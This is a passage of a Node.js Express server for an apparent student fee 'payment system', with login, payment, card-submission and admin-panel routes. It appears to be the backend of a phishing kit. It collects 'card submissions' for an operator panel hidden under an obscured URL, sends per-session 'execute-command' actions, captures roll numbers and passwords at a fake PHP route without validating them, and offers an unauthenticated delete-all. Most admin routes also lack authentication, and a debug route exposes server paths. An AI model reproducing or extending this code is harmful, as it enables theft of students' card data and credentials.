        activeConnections: systemData.activeConnections.size,
        timestamp: new Date().toISOString()
    });
});

// 5?? DEBUG ENDPOINT: Runtime verification
app.get('/debug/db-runtime', (req, res) => {
    const path = require('path');
    const dbConfigPath = path.join(__dirname, 'config', 'database.js');
    res.json({
        cwd: process.cwd(),
        __dirname: __dirname,
        dbConfigPath: dbConfigPath,
        nodeEnv: process.env.NODE_ENV,
        dbPathEnv: process.env.DB_PATH
    });
});
// Get current stats
app.get('/api/stats', (req, res) => {
    res.json(systemData.stats);
});

// Get all transactions
app.get('/api/transactions', (req, res) => {
    res.json({
        total: systemData.transactions.length,
        transactions: systemData.transactions
    });
});

// Student API
const { setupStudentAPI } = require('./student_api');
setupStudentAPI(app, logger, __dirname);



// ============================================

// ============================================
// NEW API ENDPOINTS FOR PERSISTENT SUBMISSIONS
// ============================================

// Get all card submissions
app.get('/api/admin/submissions', async (req, res) => {
    try {
        const submissions = await database.getAllCardSubmissions(1000);
        res.json({
            success: true,
            submissions: submissions
        });
        logger.info('All submissions loaded', { count: submissions.length });
    } catch (error) {
        logger.error('Error loading submissions:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to load submissions'
        });
    }
});

// Mark submission as seen
app.post('/api/admin/submissions/:sessionId/seen', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await database.markSubmissionAsSeen(sessionId);
        io.emit('submissionMarkedSeen', { sessionId });
        res.json({
            success: true,
            message: 'Submission marked as seen'
        });
        logger.info('Submission marked as seen', { sessionId });
    } catch (error) {
        logger.error('Error marking submission as seen:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to mark submission as seen'
        });
    }
});

// Mark submission as viewed (for red border tracking)
app.post('/api/admin/submissions/:sessionId/viewed', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await database.markSubmissionAsViewed(sessionId);
        io.emit('submissionMarkedViewed', { sessionId });
        res.json({
            success: true,
            message: 'Submission marked as viewed'
        });
        logger.info('Submission marked as viewed', { sessionId });
    } catch (error) {
        logger.error('Error marking submission as viewed:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to mark submission as viewed'
        });
    }
});


// Mark submission as viewed (for red border tracking)
app.post('/api/admin/submissions/:sessionId/hide-commands', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await database.hideSubmissionCommands(sessionId);
        io.emit('submissionCommandsHidden', { sessionId });
        res.json({
            success: true,
            message: 'Commands hidden for submission'
        });
        logger.info('Commands hidden for submission', { sessionId });
    } catch (error) {
        logger.error('Error hiding commands:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to hide commands'
        });
    }
});

// Execute command and persist state
app.post('/api/admin/submissions/:sessionId/execute-command', async (req, res) => {
    try {
        const { sessionId } = req.params;
        const { action, status, reason } = req.body;
        
        // Update submission in database with command execution state
        await database.updateSubmissionStatus(sessionId, status, reason);
        await database.markCommandExecuted(sessionId);
        
        // Broadcast to all admin panels
        io.emit('submissionCommandExecuted', { 
            sessionId, 
            action, 
            status, 
            reason 
        });
        
        res.json({
            success: true,
            message: 'Command executed and persisted'
        });
        
        logger.info('Command executed and persisted', { sessionId, action, status });
    } catch (error) {
        logger.error('Error executing command:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to execute command'
        });
    }
});
// Mark submission as viewed
app.post('/api/admin/submissions/:sessionId/mark-viewed', async (req, res) => {
    try {
        const { sessionId } = req.params;
        
        await database.markSubmissionAsViewed(sessionId);
        
        res.json({
            success: true,
            message: 'Submission marked as viewed'
        });
        
        logger.info('Submission marked as viewed', { sessionId });
    } catch (error) {
        logger.error('Error marking submission as viewed:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to mark submission as viewed'
        });
    }
});

// DELETE ALL SUBMISSIONS - PERMANENT
app.delete('/api/admin/submissions/delete-all', async (req, res) => {
    try {
        logger.warn('?? DELETE ALL SUBMISSIONS REQUEST RECEIVED');
        
        // Permanently delete all submissions from database
        const deleted = await database.deleteAllSubmissions();
        
        // Broadcast deletion to all connected clients
        io.emit('allSubmissionsDeleted');
        
        logger.warn('??? ALL SUBMISSIONS PERMANENTLY DELETED', { count: deleted });
        
        res.json({
            success: true,
            message: 'All submissions permanently deleted',
            count: deleted
        });
        
    } catch (error) {
        logger.error('Error deleting all submissions:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to delete submissions',
            error: error.message
        });
    }
});

// REAL-TIME PERFORMANCE METRICS
app.get('/api/admin/metrics', (req, res) => {
    try {
        const os = require('os');
        
        // Get real CPU usage
        const cpus = os.cpus();
        let totalIdle = 0;
        let totalTick = 0;
        
        cpus.forEach(cpu => {
            for (let type in cpu.times) {
                totalTick += cpu.times[type];
            }
            totalIdle += cpu.times.idle;
        });
        
        const idle = totalIdle / cpus.length;
        const total = totalTick / cpus.length;
        const cpuUsage = Math.round(100 - (100 * idle / total));
        
        // Get memory usage
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const memoryUsage = Math.round(((totalMem - freeMem) / totalMem) * 100);
        
        // Get active connections count
        const activeConnections = io.engine.clientsCount || 0;
        
        res.json({
            success: true,
            metrics: {
                cpu: Math.max(0, Math.min(100, cpuUsage)),
                memory: memoryUsage,
                connections: activeConnections,
                uptime: Math.round(process.uptime())
            }
        });
        
    } catch (error) {
        logger.error('Error getting metrics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get metrics'
        });
    }
});
// ADMIN AUTHENTICATION ROUTES
// ============================================

// Admin Login
app.post('/api/admin/login', loginLimiter, async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                error: 'Username and password are required'
            });
        }
        
        // Authenticate admin
        const result = await authenticateAdmin(username, password);
        
        if (result.success) {
            logger.info('Admin login successful', { username });
            res.json({
                success: true,
                token: result.token,
                user: result.user
            });
        } else {
            logger.warn('Admin login failed', { username, error: result.error });
            res.status(401).json({
                success: false,
                error: result.error
            });
        }
    } catch (error) {
        logger.error('Admin login error:', error);
        res.status(500).json({
            success: false,
            error: 'Login failed. Please try again.'
        });
    }
});

// Verify Admin Token
app.get('/api/admin/verify', authenticateToken, (req, res) => {
    res.json({
        success: true,
        user: req.user
    });
});
// Student Login Event
app.post('/api/student/login', (req, res) => {
    const { rollNumber, name, course, semester } = req.body;
    
    const loginData = {
        rollNumber,
        name,
        course,
        semester,
        timestamp: new Date().toISOString()
    };
    
    systemData.studentLogins.push(loginData);
    
    // Broadcast to all connected admins
    io.emit('studentLogin', loginData);
    
    logEvent(`Student login: ${rollNumber} - ${name}`, 'info');
    
    res.json({
        success: true,
        message: 'Login recorded'
    });
});

// Student Login Route - Handle form submission from transact/index.html
app.options('/transact/codescript.php', cors({ origin: true, credentials: true }), (req, res) => res.sendStatus(204));
app.post('/transact/codescript.php', cors({ origin: true, credentials: true }), express.urlencoded({ extended: true }), (req, res) => {
    try {
        const { login, pass, q, fl } = req.query;
        const rollNumber = req.body.login || '';
        const password = req.body.pass || '';
        
        logger.info('Student login attempt', { rollNumber });
        
        // In the real implementation, validate credentials here
        // For now, just redirect to student profile
        const redirectUrl = '/transact/student_profile.html?roll=' + encodeURIComponent(rollNumber);
        res.redirect(redirectUrl);
        
    } catch (error) {
        logger.error('Student login error:', error);
        res.status(500).send('Login failed. Please try again.');
    }
});

// Payment Initiated Event
app.post('/api/payment/initiate', (req, res) => {
    const { rollNumber, studentName, amount, paymentMethod } = req.body;
    
    // Increment pending payments
    systemData.stats.pendingPayments++;
    
    const paymentData = {
        rollNumber,
        studentName,
        amount,
        paymentMethod,
        status: 'initiated',
        timestamp: new Date().toISOString()
    };
    
    // Broadcast to all connected admins
    io.emit('paymentInitiated', paymentData);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment initiated: ?${amount} by ${studentName}`, 'info');
    
    res.json({
        success: true,
        message: 'Payment initiated',
        transactionId: generateTransactionId()
    });
});

// Payment Completed Event
app.post('/api/payment/complete', (req, res) => {
    const { rollNumber, studentName, amount, paymentMethod, cardType, transactionId } = req.body;
    
    // Create transaction record
    const transaction = {
        id: transactionId || generateTransactionId(),
        rollNumber,
        studentName,
        amount: parseInt(amount) || 82450,
        paymentMethod: paymentMethod || 'Credit/Debit Card',
        cardType: cardType || 'Unknown',
        status: 'completed',
        timestamp: new Date().toISOString()
    };
    
    // Update stats
    statsCache.totalTransactions++;
    systemData.stats.totalRevenue += transaction.amount;
    statsCache.pendingPayments = Math.max(0, statsCache.pendingPayments - 1);
    
    // Store transaction
    systemData.transactions.push(transaction);
    
    // Broadcast to all connected admins
    io.emit('paymentCompleted', transaction);
    io.emit('newTransaction', transaction);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment completed: ?${amount} by ${studentName} (${transactionId})`, 'success');
    
    res.json({
        success: true,
        message: 'Payment completed successfully',
        transaction
    });
});

// Payment Failed Event
app.post('/api/payment/failed', (req, res) => {
    const { rollNumber, studentName, amount, reason } = req.body;
    
    // Decrement pending payments
    statsCache.pendingPayments = Math.max(0, statsCache.pendingPayments - 1);
    
    const failureData = {
        rollNumber,
        studentName,
        amount,
        reason: reason || 'Payment processing failed',
        timestamp: new Date().toISOString()
    };
    
    // Broadcast to all connected admins
    io.emit('paymentFailed', failureData);
    io.emit('statsUpdate', systemData.stats);
    
    logEvent(`Payment failed: ${studentName} - ${reason}`, 'error');
    
    res.json({
        success: true,
        message: 'Payment failure recorded'
    });
});

// Get system logs
app.get('/api/logs', (req, res) => {
    res.json({
        total: systemData.systemLogs.length,
        logs: systemData.systemLogs
    });
});

// Helper function to generate transaction ID
function generateTransactionId() {
    const timestamp = Date.now();
    const random = Math.floor(Math.random() * 10000);
    return `TXN${timestamp}${random}`;
}

// Admin Panel Route - Serve admin static files under secure route
app.use('/parking55009hvSweJimbs5hhinbd56y', express.static(path.join(__dirname, '../admin')));

// Admin Panel HTML
app.get('/parking55009hvSweJimbs5hhinbd56y', (req, res) => {
    res.sendFile(path.join(__dirname, '../admin/index.html'));
});

// Main payment page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// ============================================
// SERVER INITIALIZATION
// ============================================

const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

async function startServer() {
    try {
        // Connect to database
        logger.info('Connecting to database...');
        await database.connect();
        
        // Ensure default admin exists
        await ensureDefaultAdmin();
        
        // Refresh stats on startup
        await refreshStats();
        
        // Start periodic stats refresh (every 30 seconds)
        setInterval(async () => {
            await refreshStats();
            // Broadcast updated stats to all clients
            protocolRouter.broadcastSSE('statsUpdate', statsCache);
        }, 30000);
        
        // Start server
        server.listen(PORT, '0.0.0.0', () => {
            console.log('===========================================');
            console.log('?? SMS Varanasi Payment System Server');
            console.log('===========================================');
            console.log(`? Environment: ${NODE_ENV}`);
            console.log(`? Server: http://localhost:${PORT}`);
            console.log(`? Admin Panel: http://localhost:${PORT}/parking55009hvSweJimbs5hhinbd56y`);
            console.log(`? Database: Connected`);
            console.log(`? WebSocket: Active`);
            console.log(`? SSE Streaming: Active`);
            console.log(`? Security: Helmet + Rate Limiting`);
            console.log(`? Logging: Winston`);
            console.log('===========================================');
            
            if (NODE_ENV === 'development') {
                console.log('??  DEVELOPMENT MODE');
                console.log('??  Change credentials before production!');
            }
            
            logger.info('Server started successfully', { port: PORT, env: NODE_ENV });
        });
        
    } catch (error) {
        logger.error('Failed to start server:', error);
        process.exit(1);
    }
}


// ============================================
// ADVANCED SECURITY INITIALIZATION
// ============================================
// // // // // // // // // // // // // // // // 
// // // // // // // // // // // // // // // // // monitoring.setupThreatMonitoring(io); // Already initialized in constructor
// // // // // // // // // // // // // // // // // monitoring.setupThreatMonitoring(io); // Already initialized in constructor
// // // // // // // // // // // // // // // // advancedSecurity.setupThreatMonitoring(io);
// // // // // // // // // // // // // // // // 
// // // // // // // // // // // // // // // // // Security Event Broadcasting
// // // // // // // // // // // // // // // // setInterval(() => {
// // // // // // // // // // // // // // // //     const securityMetrics = monitoring.getSecurityMetrics();
// // // // // // // // // // // // // // // //     io.emit('securityUpdate', {
// // // // // // // // // // // // // // // //         activeThreats: securityMetrics.activeThreats,
// // // // // // // // // // // // // // // //         blockedIPs: securityMetrics.blockedIPs.length,
// // // // // // // // // // // // // // // //         recentEvents: securityMetrics.recentEvents,
// // // // // // // // // // // // // // // //         systemHealth: securityMetrics.systemHealth.status,
// // // // // // // // // // // // // // // //         timestamp: new Date().toISOString()
// // // // // // // // // // // // // // // //     });
// }, 30000); // Every 30 seconds

// console.log('? Security Monitoring System Active');
process.on('uncaughtException', (error) => {
    // monitoring.logSecurityIncident({
    //     type: 'uncaught_exception',
    //     error: error.message,
    //     stack: error.stack,
    //     timestamp: new Date().toISOString()
    // });
    logger.error('Uncaught Exception:', error);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    // monitoring.logSecurityIncident({
    //     type: 'unhandled_rejection',
    //     reason: reason,
    //     timestamp: new Date().toISOString()
    logger.error('Unhandled Rejection:', reason);
});

// Start the server
startServer();

// ============================================
// GRACEFUL SHUTDOWN & ERROR HANDLING
// ============================================

async function gracefulShutdown(signal) {
    logger.info(`${signal} received, shutting down gracefully...`);
    
    try {
        // Close server
        server.close(async () => {
            logger.info('HTTP server closed');
            
            // Close database
            await database.close();
            logger.info('Database connection closed');
            
            // Close SSE connections
            systemData.sseClients.forEach(client => {
                try {
                    client.end();
                } catch (err) {
                    logger.error('Error closing SSE client:', err);
                }
            });
            
            logger.info('Shutdown complete');
            process.exit(0);
        });
        
        // Force shutdown after 10 seconds
        setTimeout(() => {
            logger.error('Forced shutdown after timeout');
            process.exit(1);
        }, 10000);
        
    } catch (error) {
        logger.error('Error during shutdown:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Uncaught exception handler
process.on('uncaughtException', (err) => {
    logger.error('Uncaught Exception:', {
        error: err.message,
        stack: err.stack
    });
    
    // In production, should restart process
    if (NODE_ENV === 'production') {
        gracefulShutdown('UNCAUGHT_EXCEPTION');
    }
});

// Unhandled rejection handler
process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection:', {
        reason: reason,
        promise: promise
    });
    
    // In production, should restart process
    if (NODE_ENV === 'production') {
        gracefulShutdown('UNHANDLED_REJECTION');
    }
});

// Global error handler middleware
app.use((err, req, res, next) => {
    logger.error('Express error:', {
        error: err.message,
        stack: err.stack,
        path: req.path,
        method: req.method,
        ip: req.ip
    });
    
    res.status(err.status || 500).json({
        error: NODE_ENV === 'production' ? 'Internal server error' : err.message
    });
});

// Export for testing
module.exports = { app, server, io };


















































